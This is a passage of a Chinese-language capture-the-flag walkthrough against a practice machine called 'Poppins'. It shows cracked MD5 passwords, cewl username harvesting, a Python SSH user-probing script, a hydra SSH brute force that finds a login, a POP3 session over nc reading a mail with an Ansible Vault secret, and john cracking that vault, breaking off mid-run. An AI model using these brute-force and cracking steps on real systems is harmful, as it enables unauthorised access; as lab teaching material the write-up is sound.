+Session completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>把这些内容放到一个文本内</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# john --show --format&#x3D;Raw-MD5 hash.bak | awk -F&#39;:&#39; &#39;&#123;print $2&#125;&#39; &gt; cracked_passwords.txt
+
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# cat cracked_passwords.txt 
+0831428854
+lufkin3
+amotejoel
+mymiddlename
+sexiestmonkey
+nika1212
+madeson4me
+keyki
+kiezcute
+0865508166
+ilovenickjerryjonas
+530223
+teadorohector
+14212862
+luckybear13
+hold40
+v0nowns.
+kmkm76
+eryt6587oi
+Sammon
+09202515339
+short487
+0800385914
+viking35
+ARES29
+jennycane6
+copperkiwi324
+o823o2
+simpsonss
+2173512
+jmac92777
+carlosmoya
+56371105
+gnyja4
+978645312N
+30procklisroad
+amp#88
+kaleli1975
+cash1407
+224466882468
+7297163
+adiksapink
+baby0sita
+0869169575
+mosuga1
+cesurcesur
+Dan2109&lt;3
+Cusita74
+McCain
+ddm1203
+5636378paulo
+xytyx1972
+naughtycat
+suicida*02
+0866500130
+justine145
+boggsjr
+loveyai054359503
+cannonballs
+jojoisamuffin1
+eloscar
+igorlain
+gina5432
+mouses01
+taroh527
+susancliford
+dah3ss
+21094572
+elised
+iydgmvin
+113fox.13
+nealmc
+foffbastards
+federal5
+MENZOBERRANZAN
+snoopymai12277++
+0848499262
+dazha
+vanity17
+elogue
+cocian
+Karis123456
+sheelyka
+33570654
+ben and leo
+actionlive
+rocktolife
+kent12
+middelweg
+8153154
+lcisme69
+s9136286d
+rebe11s
+lindilu
+sanchezgenao
+shadow626
+MARIEC210
+little_m
+roldann
+sunjoo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再把网页内的所有可能是用户名的字符整到另一个文本内</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# cewl http:&#x2F;&#x2F;192.168.209.213&#x2F; | tr &#39;A-Z&#39; &#39;a-z&#39; &gt;user.txt
+                                                                                                                                            
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# cat user.txt                                           
+cewl 6.2.1 (more fixes) robin wood (robin@digi.ninja) (https:&#x2F;&#x2F;digi.ninja&#x2F;)
+and
+the
+mary
+poppins
+banks
+children
+their
+michael
+jane
+with
+family
+magical
+initially
+joy
+the
+george
+who
+nanny
+through
+her
+but
+outings
+enchanting
+lessons
+home
+winifred
+importance
+life
+friend
+bert
+chimney
+sweep
+artist
+for
+arrives
+brings
+somewhat
+strong
+bond
+learns
+banker
+stern
+enjoys
+disciplined
+father
+wisdom
+fantastical
+humor
+providing
+joins
+often
+close
+street
+multitalented
+adventures
+journeys
+elder
+joys
+simple
+appreciate
+comes
+skeptical
+quickly
+drawn
+causes
+social
+into
+world
+preoccupied
+mother
+wife
+younger
+influence
+curious
+adventurous
+forms
+valuable
+whimsical
+through
+adventure
+magic
+brand
+unique
+she
+wind
+east
+carried
+when
+mischievous
+need
+london
+century
+turn
+plot
+movie
+wonder
+classic
+timeless
+them
+teaching
+care
+she
+abilities
+perfect
+practically
+happiness
+bring
+perspectives
+challenge
+that
+escapades
+unforgettable
+leads
+with
+everyday
+love
+rediscover
+parents
+helps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>尝试爆破一下ssh登陆的用户和密码，结果一直提示Permission denied (publickey)</p>
+<p>根据这一情况写个脚本运行一下</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# python3 1.py             
+🔍 开始检查 120 个用户通过 SSH 登录到 192.168.209.213 是否出现 &#39;publickey&#39; 错误...
+⏱️  每个用户最大尝试时间：3 秒
+--------------------------------------------------
+🔓 正在测试用户: cewl 6.2.1 (more fixes) robin wood (robin@digi.ninja) (https:&#x2F;&#x2F;digi.ninja&#x2F;) ... ✅ 未触发 publickey 错误（或连接异常&#x2F;超时）
+🔓 正在测试用户: and ... ❌ 触发 publickey 错误
+🔓 正在测试用户: the ... ❌ 触发 publickey 错误
+🔓 正在测试用户: mary ... ❌ 触发 publickey 错误
+🔓 正在测试用户: poppins ... ❌ 触发 publickey 错误
+🔓 正在测试用户: banks ... ❌ 触发 publickey 错误
+🔓 正在测试用户: children ... ❌ 触发 publickey 错误
+🔓 正在测试用户: their ... ❌ 触发 publickey 错误
+🔓 正在测试用户: michael ... ❌ 触发 publickey 错误
+jane@192.168.209.213&#39;s password: 🔓 正在测试用户: jane ... ⏱️  用户 &#39;jane&#39;：SSH 连接超时（3秒）
+✅ 未触发 publickey 错误（或连接异常&#x2F;超时）
+🔓 正在测试用户: with ... ❌ 触发 publickey 错误
+🔓 正在测试用户: family ... ❌ 触发 publickey 错误
+🔓 正在测试用户: magical ... ❌ 触发 publickey 错误
+🔓 正在测试用户: initially ... ❌ 触发 publickey 错误
+🔓 正在测试用户: joy ... ❌ 触发 publickey 错误
+🔓 正在测试用户: the ... ❌ 触发 publickey 错误
+🔓 正在测试用户: george ... ❌ 触发 publickey 错误
+🔓 正在测试用户: who ... ❌ 触发 publickey 错误
+🔓 正在测试用户: nanny ... ❌ 触发 publickey 错误
+🔓 正在测试用户: through ... ❌ 触发 publickey 错误
+🔓 正在测试用户: her ... ❌ 触发 publickey 错误
+🔓 正在测试用户: but ... ❌ 触发 publickey 错误
+🔓 正在测试用户: outings ... ❌ 触发 publickey 错误
+🔓 正在测试用户: enchanting ... ❌ 触发 publickey 错误
+🔓 正在测试用户: lessons ... ❌ 触发 publickey 错误
+🔓 正在测试用户: home ... ❌ 触发 publickey 错误
+🔓 正在测试用户: winifred ... ❌ 触发 publickey 错误
+🔓 正在测试用户: importance ... ❌ 触发 publickey 错误
+🔓 正在测试用户: life ... ❌ 触发 publickey 错误
+🔓 正在测试用户: friend ... ❌ 触发 publickey 错误
+bert@192.168.209.213&#39;s password: 🔓 正在测试用户: bert ... ⏱️  用户 &#39;bert&#39;：SSH 连接超时（3秒）
+✅ 未触发 publickey 错误（或连接异常&#x2F;超时）
+🔓 正在测试用户: chimney ... ❌ 触发 publickey 错误
+🔓 正在测试用户: sweep ... ❌ 触发 publickey 错误
+🔓 正在测试用户: artist ... ❌ 触发 publickey 错误
+🔓 正在测试用户: for ... ❌ 触发 publickey 错误
+🔓 正在测试用户: arrives ... ❌ 触发 publickey 错误
+🔓 正在测试用户: brings ... ❌ 触发 publickey 错误
+🔓 正在测试用户: somewhat ... ❌ 触发 publickey 错误
+🔓 正在测试用户: strong ... ❌ 触发 publickey 错误
+🔓 正在测试用户: bond ... ❌ 触发 publickey 错误
+🔓 正在测试用户: learns ... ❌ 触发 publickey 错误
+🔓 正在测试用户: banker ... ❌ 触发 publickey 错误
+🔓 正在测试用户: stern ... ❌ 触发 publickey 错误
+🔓 正在测试用户: enjoys ... ❌ 触发 publickey 错误
+🔓 正在测试用户: disciplined ... ❌ 触发 publickey 错误
+🔓 正在测试用户: father ... ❌ 触发 publickey 错误
+🔓 正在测试用户: wisdom ... ❌ 触发 publickey 错误
+🔓 正在测试用户: fantastical ... ❌ 触发 publickey 错误
+🔓 正在测试用户: humor ... ❌ 触发 publickey 错误
+🔓 正在测试用户: providing ... ❌ 触发 publickey 错误
+🔓 正在测试用户: joins ... ❌ 触发 publickey 错误
+🔓 正在测试用户: often ... ❌ 触发 publickey 错误
+🔓 正在测试用户: close ... ❌ 触发 publickey 错误
+🔓 正在测试用户: street ... ❌ 触发 publickey 错误
+🔓 正在测试用户: multitalented ... ❌ 触发 publickey 错误
+🔓 正在测试用户: adventures ... ❌ 触发 publickey 错误
+🔓 正在测试用户: journeys ... ❌ 触发 publickey 错误
+🔓 正在测试用户: elder ... ❌ 触发 publickey 错误
+🔓 正在测试用户: joys ... ❌ 触发 publickey 错误
+🔓 正在测试用户: simple ... ❌ 触发 publickey 错误
+🔓 正在测试用户: appreciate ... ❌ 触发 publickey 错误
+🔓 正在测试用户: comes ... ❌ 触发 publickey 错误
+🔓 正在测试用户: skeptical ... ❌ 触发 publickey 错误
+🔓 正在测试用户: quickly ... ❌ 触发 publickey 错误
+🔓 正在测试用户: drawn ... ❌ 触发 publickey 错误
+🔓 正在测试用户: causes ... ❌ 触发 publickey 错误
+🔓 正在测试用户: social ... ❌ 触发 publickey 错误
+🔓 正在测试用户: into ... ❌ 触发 publickey 错误
+🔓 正在测试用户: world ... ❌ 触发 publickey 错误
+🔓 正在测试用户: preoccupied ... ❌ 触发 publickey 错误
+🔓 正在测试用户: mother ... ❌ 触发 publickey 错误
+🔓 正在测试用户: wife ... ❌ 触发 publickey 错误
+🔓 正在测试用户: younger ... ❌ 触发 publickey 错误
+🔓 正在测试用户: influence ... ❌ 触发 publickey 错误
+🔓 正在测试用户: curious ... ❌ 触发 publickey 错误
+🔓 正在测试用户: adventurous ... ❌ 触发 publickey 错误
+🔓 正在测试用户: forms ... ❌ 触发 publickey 错误
+🔓 正在测试用户: valuable ... ❌ 触发 publickey 错误
+🔓 正在测试用户: whimsical ... ❌ 触发 publickey 错误
+🔓 正在测试用户: through ... ❌ 触发 publickey 错误
+🔓 正在测试用户: adventure ... ❌ 触发 publickey 错误
+🔓 正在测试用户: magic ... ❌ 触发 publickey 错误
+🔓 正在测试用户: brand ... ❌ 触发 publickey 错误
+🔓 正在测试用户: unique ... ❌ 触发 publickey 错误
+🔓 正在测试用户: she ... ❌ 触发 publickey 错误
+🔓 正在测试用户: wind ... ❌ 触发 publickey 错误
+🔓 正在测试用户: east ... ❌ 触发 publickey 错误
+🔓 正在测试用户: carried ... ❌ 触发 publickey 错误
+🔓 正在测试用户: when ... ❌ 触发 publickey 错误
+🔓 正在测试用户: mischievous ... ❌ 触发 publickey 错误
+🔓 正在测试用户: need ... ❌ 触发 publickey 错误
+🔓 正在测试用户: london ... ❌ 触发 publickey 错误
+🔓 正在测试用户: century ... ❌ 触发 publickey 错误
+🔓 正在测试用户: turn ... ❌ 触发 publickey 错误
+🔓 正在测试用户: plot ... ❌ 触发 publickey 错误
+🔓 正在测试用户: movie ... ❌ 触发 publickey 错误
+🔓 正在测试用户: wonder ... ❌ 触发 publickey 错误
+🔓 正在测试用户: classic ... ❌ 触发 publickey 错误
+🔓 正在测试用户: timeless ... ❌ 触发 publickey 错误
+🔓 正在测试用户: them ... ❌ 触发 publickey 错误
+🔓 正在测试用户: teaching ... ❌ 触发 publickey 错误
+🔓 正在测试用户: care ... ❌ 触发 publickey 错误
+🔓 正在测试用户: she ... ❌ 触发 publickey 错误
+🔓 正在测试用户: abilities ... ❌ 触发 publickey 错误
+🔓 正在测试用户: perfect ... ❌ 触发 publickey 错误
+🔓 正在测试用户: practically ... ❌ 触发 publickey 错误
+🔓 正在测试用户: happiness ... ❌ 触发 publickey 错误
+🔓 正在测试用户: bring ... ❌ 触发 publickey 错误
+🔓 正在测试用户: perspectives ... ❌ 触发 publickey 错误
+🔓 正在测试用户: challenge ... ❌ 触发 publickey 错误
+🔓 正在测试用户: that ... ❌ 触发 publickey 错误
+🔓 正在测试用户: escapades ... ❌ 触发 publickey 错误
+🔓 正在测试用户: unforgettable ... ❌ 触发 publickey 错误
+🔓 正在测试用户: leads ... ❌ 触发 publickey 错误
+🔓 正在测试用户: with ... ❌ 触发 publickey 错误
+🔓 正在测试用户: everyday ... ❌ 触发 publickey 错误
+🔓 正在测试用户: love ... ❌ 触发 publickey 错误
+🔓 正在测试用户: rediscover ... ❌ 触发 publickey 错误
+🔓 正在测试用户: parents ... ❌ 触发 publickey 错误
+🔓 正在测试用户: helps ... ❌ 触发 publickey 错误
+
+--------------------------------------------------
+⚠️  以下用户登录时出现 &#39;publickey&#39; 错误：
+   - and
+   - the
+   - mary
+   - poppins
+   - banks
+   - children
+   - their
+   - michael
+   - with
+   - family
+   - magical
+   - initially
+   - joy
+   - the
+   - george
+   - who
+   - nanny
+   - through
+   - her
+   - but
+   - outings
+   - enchanting
+   - lessons
+   - home
+   - winifred
+   - importance
+   - life
+   - friend
+   - chimney
+   - sweep
+   - artist
+   - for
+   - arrives
+   - brings
+   - somewhat
+   - strong
+   - bond
+   - learns
+   - banker
+   - stern
+   - enjoys
+   - disciplined
+   - father
+   - wisdom
+   - fantastical
+   - humor
+   - providing
+   - joins
+   - often
+   - close
+   - street
+   - multitalented
+   - adventures
+   - journeys
+   - elder
+   - joys
+   - simple
+   - appreciate
+   - comes
+   - skeptical
+   - quickly
+   - drawn
+   - causes
+   - social
+   - into
+   - world
+   - preoccupied
+   - mother
+   - wife
+   - younger
+   - influence
+   - curious
+   - adventurous
+   - forms
+   - valuable
+   - whimsical
+   - through
+   - adventure
+   - magic
+   - brand
+   - unique
+   - she
+   - wind
+   - east
+   - carried
+   - when
+   - mischievous
+   - need
+   - london
+   - century
+   - turn
+   - plot
+   - movie
+   - wonder
+   - classic
+   - timeless
+   - them
+   - teaching
+   - care
+   - she
+   - abilities
+   - perfect
+   - practically
+   - happiness
+   - bring
+   - perspectives
+   - challenge
+   - that
+   - escapades
+   - unforgettable
+   - leads
+   - with
+   - everyday
+   - love
+   - rediscover
+   - parents
+   - helps
+
+📄 结果已保存到文件: users_with_publickey_failure_20250902_213609.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>脚本：</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python3
+import subprocess
+import sys
+from pathlib import Path
+
+# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+# 配置区域（可修改）
+# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+TARGET_IP &#x3D; &quot;192.168.209.213&quot;  # 目标服务器 IP
+USER_LIST_FILE &#x3D; &quot;user.txt&quot;    # 每行一个用户名
+TIMEOUT_SECONDS &#x3D; 3            # 每个 SSH 尝试的超时时间（秒）
+OUTPUT_FILE &#x3D; f&quot;users_with_publickey_failure_&#123;__import__(&#39;datetime&#39;).datetime.now().strftime(&#39;%Y%m%d_%H%M%S&#39;)&#125;.txt&quot;
+
+# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+# 工具函数
+# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+
+def read_users_from_file(file_path):
+    &quot;&quot;&quot;从文件中读取用户名列表，返回用户名列表（过滤空行）&quot;&quot;&quot;
+    users &#x3D; []
+    try:
+        with open(file_path, &#39;r&#39;, encoding&#x3D;&#39;utf-8&#39;) as f:
+            for line in f:
+                user &#x3D; line.strip()
+                if user:  # 排除空行
+                    users.append(user)
+    except FileNotFoundError:
+        print(f&quot;❌ 错误：用户列表文件 &#39;&#123;file_path&#125;&#39; 不存在！&quot;)
+        sys.exit(1)
+    return users
+
+def test_ssh_user_login(username):
+    &quot;&quot;&quot;测试某个用户通过 SSH 登录时是否返回 &#39;publickey&#39; 错误&quot;&quot;&quot;
+    cmd &#x3D; [&quot;ssh&quot;, f&quot;&#123;username&#125;@&#123;TARGET_IP&#125;&quot;]
+    try:
+        # 执行 ssh 命令，设置超时，捕获标准错误和标准输出
+        result &#x3D; subprocess.run(
+            cmd,
+            stdout&#x3D;subprocess.PIPE,
+            stderr&#x3D;subprocess.STDOUT,  # 合并 stdout 和 stderr
+            text&#x3D;True,
+            timeout&#x3D;TIMEOUT_SECONDS
+        )
+        output &#x3D; result.stdout.lower()  # 转为小写便于匹配
+
+        # 检查输出中是否包含 &quot;publickey&quot;
+        if &quot;publickey&quot; in output:
+            return True  # 出现 publickey 错误
+        else:
+            return False  # 没有出现 publickey 错误
+    except subprocess.TimeoutExpired:
+        print(f&quot;⏱️  用户 &#39;&#123;username&#125;&#39;：SSH 连接超时（&#123;TIMEOUT_SECONDS&#125;秒）&quot;)
+        return False  # 超时不认为是 publickey 错误
+    except Exception as e:
+        print(f&quot;⚠️  用户 &#39;&#123;username&#125;&#39;：SSH 连接异常 - &#123;e&#125;&quot;)
+        return False
+
+def main():
+    users &#x3D; read_users_from_file(USER_LIST_FILE)
+
+    if not users:
+        print(f&quot;❌ 文件 &#39;&#123;USER_LIST_FILE&#125;&#39; 中没有有效的用户名。&quot;)
+        return
+
+    print(f&quot;🔍 开始检查 &#123;len(users)&#125; 个用户通过 SSH 登录到 &#123;TARGET_IP&#125; 是否出现 &#39;publickey&#39; 错误...&quot;)
+    print(f&quot;⏱️  每个用户最大尝试时间：&#123;TIMEOUT_SECONDS&#125; 秒&quot;)
+    print(&quot;--------------------------------------------------&quot;)
+
+    failed_users &#x3D; []  # 保存所有出现 publickey 错误的用户
+
+    for user in users:
+        print(f&quot;🔓 正在测试用户: &#123;user&#125; ...&quot;, end&#x3D;&quot; &quot;)
+        if test_ssh_user_login(user):
+            print(&quot;❌ 触发 publickey 错误&quot;)
+            failed_users.append(user)
+        else:
+            print(&quot;✅ 未触发 publickey 错误（或连接异常&#x2F;超时）&quot;)
+
+    # 输出结果到屏幕和文件
+    if failed_users:
+        print(&quot;\n--------------------------------------------------&quot;)
+        print(&quot;⚠️  以下用户登录时出现 &#39;publickey&#39; 错误：&quot;)
+        for u in failed_users:
+            print(f&quot;   - &#123;u&#125;&quot;)
+        
+        # 写入到输出文件
+        try:
+            with open(OUTPUT_FILE, &#39;w&#39;, encoding&#x3D;&#39;utf-8&#39;) as f:
+                f.write(f&quot;以下用户在 &#123;TARGET_IP&#125; 上登录时出现 &#39;publickey&#39; 错误：\n&quot;)
+                f.write(&quot;&#x3D;&quot;*50 + &quot;\n&quot;)
+                for u in failed_users:
+                    f.write(f&quot;&#123;u&#125;\n&quot;)
+            print(f&quot;\n📄 结果已保存到文件: &#123;OUTPUT_FILE&#125;&quot;)
+        except Exception as e:
+            print(f&quot;⚠️  无法写入输出文件: &#123;e&#125;&quot;)
+    else:
+        print(&quot;\n✅ 所有用户均未触发 &#39;publickey&#39; 错误，或连接异常。&quot;)
+
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>只有两个用户可用ssh登陆jane&#x2F;bert</p>
+<p>再接着hydra爆破</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# hydra -L user -P  cracked_passwords.txt ssh:&#x2F;&#x2F;192.168.209.213 
+Hydra v9.5 (c) 2023 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2025-09-02 21:38:24
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 303 login tries (l:3&#x2F;p:101), ~19 tries per task
+[DATA] attacking ssh:&#x2F;&#x2F;192.168.209.213:22&#x2F;
+[22][ssh] host: 192.168.209.213   login: bert   password: jmac92777
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2025-09-02 21:39:20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个用户无法正常登陆</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# ssh bert@192.168.209.213  
+bert@192.168.209.213&#39;s password: 
+Linux Poppins 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU&#x2F;Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
+
+Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+This account is currently not available.
+Connection to 192.168.209.213 closed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>提示有一个mail文件，想到110这个端口，nc上去看看</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# nc 192.168.209.213 110
++OK Dovecot (Debian) ready.
+user bert
++OK
+Pass jmac92777
++OK Logged in.
+stat
++OK 1 1517
+retr 1
++OK 1517 octets
+Return-path: &lt;jane@poppins&gt;
+Envelope-to: bert@poppins
+Delivery-date: Fri, 29 Aug 2025 06:33:49 -0400
+Received: from jane by Poppins with local (Exim 4.94.2)
+        (envelope-from &lt;jane@poppins&gt;)
+        id 1urwQW-0001RQ-CD
+        for bert@poppins; Fri, 29 Aug 2025 06:33:48 -0400
+To: bert@poppins
+Subject: Urgent: Prod Server Credentials for Ansible Playbook
+MIME-Version: 1.0
+Content-Type: text&#x2F;plain; charset&#x3D;&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;E1urwQW-0001RQ-CD@Poppins&gt;
+From: jane@poppins
+Date: Fri, 29 Aug 2025 06:33:48 -0400
+
+Hi Bert,
+
+I&#39;ve just finished the new Ansible playbook for the a-27 software deployment on our main production server, &#96;web01.poppins.dsz&#96;. It&#39;s ready to go.
+
+The playbook contains some sensitive API keys, so I&#39;ve encrypted the variables using Ansible Vault. You&#39;ll need to use the &#96;ansible-vault decrypt&#96; command to run it.
+
+Here is the vault string you&#39;ll need to paste into the &#96;secrets.yml&#96; file.
+
+&#96;&#96;&#96;
+$ANSIBLE_VAULT;1.1;AES256
+66626631636362303332633238373338386634373434646532656534323230333938303331663630
+3236333934663930343263363831353138323630393134320a366366393939373636386538336336
+34353536656637313762323832643339633234656635326137633439303730373335386536306436
+6335363366376634630a326563623737626337353436323565643365333061663661396337613731
+3730
+&#96;&#96;&#96;
+Let me know if you hit any issues. We need to get this deployed by EOD.
+
+Thanks,
+Jane
+.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Ansible Vault解密</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# vi 1.vault                              
+                                                                                                                                            
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# ansible2john 1.vault &gt; tmp
+                                                                                                                                            
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt tmp
+Using default input encoding: UTF-8
+Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256&#x2F;256 AVX2 8x])
+Cost 1 (iteration count) is 10000 for all loaded hashes
+Will run 4 OpenMP threads
